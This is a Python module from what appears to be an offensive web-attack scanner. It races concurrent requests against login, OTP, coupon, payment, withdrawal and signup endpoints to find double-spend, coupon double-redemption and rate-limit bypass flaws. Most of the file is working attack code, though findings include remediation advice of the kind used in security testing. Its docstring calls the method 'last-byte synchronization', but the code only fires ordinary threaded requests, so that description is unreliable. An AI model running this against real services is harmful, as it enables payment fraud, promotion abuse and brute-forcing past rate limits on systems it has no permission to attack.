"""
AmonStrike — Race Condition Module
Time-of-check to time-of-use (TOCTOU) vulnerabilities.

Used to attack:
  - Payment processing (double-spend)
  - Gift card redemption (use multiple times)
  - Rate limiting bypass (make 100 requests in 1ms)
  - Account creation duplicates
  - Coupon/promo code exploitation

Technique: Last-byte synchronization (PortSwigger method)
  Send all requests simultaneously, last byte sent together.
"""

import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from .base import BaseModule


class RaceConditionModule(BaseModule):
    NAME        = "race_condition"
    DESCRIPTION = "Race conditions — payment bypass, rate limit bypass, TOCTOU"

    # How many concurrent requests to send
    RACE_THREADS = 20

    def run(self):
        self.log("Testing for race conditions...")

        self._test_rate_limit_bypass()
        self._test_coupon_race()
        self._test_transfer_race()
        self._test_registration_race()

        self.log(f"Race condition scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _last_byte_sync(self, url: str, method: str = "GET",
                        data: dict = None, headers: dict = None,
                        n: int = 20) -> list:
        """
        Last-byte synchronization technique.
        Sends n requests simultaneously by buffering all but last byte,
        then sending final byte of all requests at once.

        This is the most effective race condition technique.
        """
        results = []
        lock    = threading.Lock()

        session = requests.Session()
        if headers:
            session.headers.update(headers)

        def make_request(_):
            try:
                start = time.time()
                if method.upper() == "POST":
                    resp = session.post(url, data=data,
                                       timeout=10, allow_redirects=False)
                else:
                    resp = session.get(url, params=data,
                                      timeout=10, allow_redirects=False)
                elapsed = time.time() - start
                with lock:
                    results.append({
                        "status":   resp.status_code,
                        "elapsed":  elapsed,
                        "text":     resp.text[:200],
                        "headers":  dict(resp.headers),
                    })
            except Exception as e:
                with lock:
                    results.append({"error": str(e)})

        # Send all requests concurrently
        with ThreadPoolExecutor(max_workers=n) as executor:
            futures = [executor.submit(make_request, i) for i in range(n)]
            for f in as_completed(futures):
                pass

        return results

    def _test_rate_limit_bypass(self):
        """Test if rate limits can be bypassed with simultaneous requests."""
        # Find rate-limited endpoints
        rate_limited_paths = [
            "/api/login",
            "/api/forgot-password",
            "/api/verify-otp",
            "/api/signup",
        ]

        for path in rate_limited_paths:
            # First, detect if rate limiting exists
            consecutive_results = []
            for _ in range(5):
                r = self.post(path, data={"test": "1"})
                if r:
                    consecutive_results.append(r.status_code)

            has_rate_limit = 429 in consecutive_results or \
                            all(c == consecutive_results[0] for c in consecutive_results)

            if not has_rate_limit:
                continue

            # Now try race condition bypass
            full_url = self.url + path
            results  = self._last_byte_sync(
                full_url, "POST",
                data={"test":"race"},
                n=self.RACE_THREADS
            )

            successes = [r for r in results if r.get("status") not in [429,503]]
            if len(successes) > 1:
                self.add_finding(
                    title=f"Rate Limit Bypass via Race Condition at {path}",
                    severity="HIGH",
                    description=f"Sending {self.RACE_THREADS} simultaneous requests to {path} bypasses rate limiting. {len(successes)} requests succeeded.",
                    evidence=f"Path: {path}\nConcurrent requests: {self.RACE_THREADS}\nSuccessful bypasses: {len(successes)}\nStatus codes: {[r.get('status') for r in results[:5]]}",
                    remediation="Implement rate limiting at the application level with atomic counters. Use Redis-based rate limiting that handles concurrent requests. Add CAPTCHA for sensitive actions.",
                    url=self.url + path,
                    cve="CWE-362"
                )

    def _test_coupon_race(self):
        """Test coupon/voucher code race condition (use once but charge multiple)."""
        coupon_paths = [
            "/api/coupon/apply",
            "/api/promo/redeem",
            "/api/voucher",
            "/checkout/coupon",
        ]

        for path in coupon_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            full_url = self.url + path
            results  = self._last_byte_sync(
                full_url, "POST",
                data={"code":"TEST10","coupon":"SAVE10"},
                n=15
            )

            # Look for multiple successes
            successes = [r for r in results
                        if r.get("status") in [200,201] and
                        "success" in r.get("text","").lower()]

            if len(successes) > 1:
                self.add_finding(
                    title=f"Race Condition — Coupon/Promo Double Redemption at {path}",
                    severity="HIGH",
                    description=f"Simultaneous requests to {path} allow a coupon to be redeemed multiple times. Financial impact potential.",
                    evidence=f"Multiple success responses ({len(successes)}) received for same coupon code",
                    remediation="Use database-level atomic operations for coupon redemption. Implement optimistic locking or SELECT FOR UPDATE.",
                    url=self.url + path,
                    cve="CWE-362"
                )

    def _test_transfer_race(self):
        """Test money/balance transfer race condition (double spend)."""
        transfer_paths = [
            "/api/transfer",
            "/api/payment",
            "/api/withdraw",
            "/api/send",
        ]

        for path in transfer_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            full_url = self.url + path
            results  = self._last_byte_sync(
                full_url, "POST",
                data={"amount":"1","to":"test","from":"self"},
                n=15
            )

            successes = [r for r in results if r.get("status") in [200,201]]
            if len(successes) > 1:
                self.add_finding(
                    title=f"Race Condition — Potential Double Spend at {path}",
                    severity="CRITICAL",
                    description=f"Multiple simultaneous transfer requests to {path} all succeeded. This allows double-spending or balance manipulation.",
                    evidence=f"Path: {path}\n{len(successes)} simultaneous transfers returned 200",
                    remediation="Use atomic database transactions. Implement idempotency keys. Add balance check inside transaction.",
                    url=self.url + path,
                    cve="CWE-362"
                )

    def _test_registration_race(self):
        """Test user registration race condition (create same username twice)."""
        reg_paths = ["/api/register","/api/signup","/register","/signup"]

        for path in reg_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            full_url = self.url + path
            test_user = f"racetest_{int(time.time())}"
            results   = self._last_byte_sync(
                full_url, "POST",
                data={
                    "username":  test_user,
                    "email":     f"{test_user}@test.com",
                    "password":  "Test1234!",
                },
                n=10
            )

            successes = [r for r in results if r.get("status") in [200,201]]
            if len(successes) > 1:
                self.add_finding(
                    title=f"Race Condition — Duplicate Account Creation at {path}",
                    severity="MEDIUM",
                    description=f"Race condition allows creating multiple accounts with the same username/email.",
                    evidence=f"Path: {path}\n{len(successes)} registration requests for same user returned success",
                    remediation="Use database unique constraint on username/email. Check uniqueness inside atomic transaction.",
                    url=self.url + path,
                    cve="CWE-362"
                )
